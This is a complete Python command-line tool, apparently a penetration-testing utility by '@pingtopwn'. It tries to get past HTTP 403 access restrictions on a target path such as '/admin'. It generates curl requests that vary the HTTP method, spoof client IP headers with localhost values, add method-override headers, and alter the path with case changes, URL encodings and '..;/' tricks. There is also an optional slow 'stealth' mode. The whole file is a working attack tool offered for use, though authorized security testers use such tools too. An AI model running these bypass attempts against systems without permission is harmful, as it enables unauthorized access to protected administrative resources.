#!/usr/bin/env python3

import sys
import time
import itertools
import subprocess

from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# ==========================================
# BANNER
# ==========================================

BANNER = r"""

██████╗ ██╗   ██╗██████╗ ██╗  ██╗███████╗██╗  ██╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██║  ██║██╔════╝╚██╗██╔╝
██████╔╝ ╚████╔╝ ██████╔╝███████║█████╗   ╚███╔╝
██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║██╔══╝   ██╔██╗
██████╔╝   ██║   ██║     ██║  ██║███████╗██╔╝ ██╗
╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                    by @pingtopwn

"""

print(BANNER)

# ==========================================
# CONFIG
# ==========================================

HTTP_METHODS = [
    "GET",
    "POST",
    "PUT",
    "OPTIONS",
    "PATCH",
    "TRACE",
    "HEAD"
]

OVERRIDE_METHODS = HTTP_METHODS

HEADER_METHODS = [
    "GET",
    "POST",
    "PUT"
]

IP_VALUES = [
    "127.0.0.1",
    "localhost"
]

IP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "X-Cluster-Client-IP",
    "X_Forwarded_For",
    "X-ProxyUser-Ip",
    "True-Client-IP",
    "X-Server-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Forwarderd-Host",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "X-Remote-IP"
]

ALL_COMMANDS = []

THREAD_MODE = 1

# ==========================================
# USAGE
# ==========================================

def usage():

    print(f"Usage:")
    print(f"python3 {sys.argv[0]} https://target.com/admin")
    print(f"python3 {sys.argv[0]} https://target.com/admin -t 0")
    print(f"python3 {sys.argv[0]} https://target.com/admin -t 2")

    sys.exit(1)


# ==========================================
# ARGUMENT PARSER
# ==========================================

if len(sys.argv) < 2:
    usage()

TARGET = sys.argv[1]

if "-t" in sys.argv:

    try:

        THREAD_MODE = int(
            sys.argv[sys.argv.index("-t") + 1]
        )

    except:
        THREAD_MODE = 1


# ==========================================
# CURL EXECUTION
# ==========================================

def run_curl(cmd):

    try:

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=15
        )

        status_code = "000"

        for line in result.stdout.splitlines():

            if line.startswith("HTTP/"):

                parts = line.split()

                if len(parts) >= 2:
                    status_code = parts[1]

        printable_cmd = " ".join(
            [f"$'{x}'" for x in cmd]
        )

        print(f"{status_code} {printable_cmd}")

    except Exception:

        printable_cmd = " ".join(
            [f"$'{x}'" for x in cmd]
        )

        print(f"ERR {printable_cmd}")


# ==========================================
# CASE MANIPULATION
# ==========================================

def generate_case_variations(word):

    variations = set()

    for combo in itertools.product(
        *[(c.lower(), c.upper()) for c in word]
    ):

        variations.add("".join(combo))

    return list(variations)


def manipulate_path(path):

    manipulated = []

    stripped = path.strip("/")

    if "." in stripped:

        filename, ext = stripped.split(".", 1)

        for var in generate_case_variations(filename):

            manipulated.append(f"/{var}.{ext}")

    else:

        for var in generate_case_variations(stripped):

            manipulated.append(f"/{var}")

    return manipulated


# ==========================================
# URL ENCODING
# ==========================================

def encoding_variations(path):

    path = path.rstrip("/")

    return [

        path + "/.",
        path + "%20",
        path + "%09",
        path + "%00",

        path + "..;/",
        path + "/..;/",

        path.replace("/", "%2f"),
        path.replace(".", "%2e")

    ]


# ==========================================
# ALT PATHS
# ==========================================

def alternative_paths(path):

    p = path.strip("/")

    return [

        f"/{p}/",
        f"/{p}//",
        f"/{p}/./",

        f"/./{p}",
        f"/%2e/{p}",

        f"/{p}/..;/",
        f"/{p}/{p}/"

    ]


# ==========================================
# URL PARSING
# ==========================================

parsed = urlparse(TARGET)

BASE = f"{parsed.scheme}://{parsed.netloc}"
PATH = parsed.path

if PATH == "":
    PATH = "/"


# ==========================================
# 1. HTTP METHOD TESTING
# ==========================================

for method in HTTP_METHODS:

    cmd = [

        "curl",
        "-i",
        "-s",
        "-k",

        "-X",
        method,

        TARGET
    ]

    ALL_COMMANDS.append(cmd)


# ==========================================
# 2. HEADER BYPASS TESTING
# GET + POST + PUT
# ==========================================

for method in HEADER_METHODS:

    for header in IP_HEADERS:

        for ip in IP_VALUES:

            cmd = [

                "curl",
                "-i",
                "-s",
                "-k",

                "-X",
                method,

                "-H",
                f"{header}: {ip}",

                TARGET
            ]

            ALL_COMMANDS.append(cmd)


# ==========================================
# 3. METHOD OVERRIDE TESTING
# ==========================================

for method in OVERRIDE_METHODS:

    cmd = [

        "curl",
        "-i",
        "-s",
        "-k",

        "-X",
        "GET",

        "-H",
        f"X-HTTP-Method-Override: {method}",

        TARGET
    ]

    ALL_COMMANDS.append(cmd)


# ==========================================
# 4. CASE MANIPULATION
# ==========================================

for manipulated in manipulate_path(PATH):

    url = BASE + manipulated

    cmd = [

        "curl",
        "-i",
        "-s",
        "-k",

        "-X",
        "GET",

        url
    ]

    ALL_COMMANDS.append(cmd)


# ==========================================
# 5. ENCODING BYPASS
# ==========================================

for enc in encoding_variations(PATH):

    url = BASE + enc

    cmd = [

        "curl",
        "-i",
        "-s",
        "-k",

        "-X",
        "GET",

        url
    ]

    ALL_COMMANDS.append(cmd)


# ==========================================
# 6. ALT PATH BYPASS
# ==========================================

for alt in alternative_paths(PATH):

    url = BASE + alt

    cmd = [

        "curl",
        "-i",
        "-s",
        "-k",

        "-X",
        "GET",

        url
    ]

    ALL_COMMANDS.append(cmd)


# ==========================================
# THREAD EXECUTION
# ==========================================

if THREAD_MODE == 0:

    # Slow / Stealth Mode

    for cmd in ALL_COMMANDS:

        run_curl(cmd)

        time.sleep(3)

elif THREAD_MODE == 2:

    # Fast Mode (2 Parallel Requests)

    with ThreadPoolExecutor(max_workers=2) as executor:

        executor.map(run_curl, ALL_COMMANDS)

else:

    # Default Mode

    for cmd in ALL_COMMANDS:

        run_curl(cmd)
